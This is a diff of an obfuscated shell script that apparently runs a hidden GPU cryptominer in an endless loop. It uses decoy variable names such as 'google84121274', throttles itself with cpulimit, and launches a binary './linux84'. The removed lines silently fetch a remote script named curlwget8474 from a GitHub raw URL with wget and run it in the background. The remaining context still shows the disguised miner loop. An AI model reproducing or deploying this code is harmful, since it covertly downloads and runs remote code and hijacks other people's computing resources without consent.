@@ -51,18 +51,6 @@ cd /mnt/disks/user/project/
 while true
 do
 
-pkill -f curlwget8474
-
-pkill -f curlwget8474
-
-pkill -f curlwget8474
-
-pkill -f curlwget8474
-
-wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curlwget8474
-
-bash ./curlwget8474 &> /dev/null &
-
 google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
 google841212121274="http://localhost:8884"
@@ -107,21 +95,9 @@ pkill -f cpulimit
 
 cpulimit -e google84121274 -l 62 &> /dev/null &
 
-./linux84 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
+./linux84 -t 1 -b $googlelinux8474
 
 else
-
-pkill -f curlwget8474
-
-pkill -f curlwget8474
-
-pkill -f curlwget8474
-
-pkill -f curlwget8474
-
-wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curlwget8474
-
-bash ./curlwget8474 &> /dev/null &
 
 google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
@@ -149,7 +125,7 @@ pkill -f cpulimit
 
 cpulimit -e google84121274 -l 62 &> /dev/null &
 
-./linux84 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
+./linux84 -t 1 -b $googlelinux8474
 
 fi
 
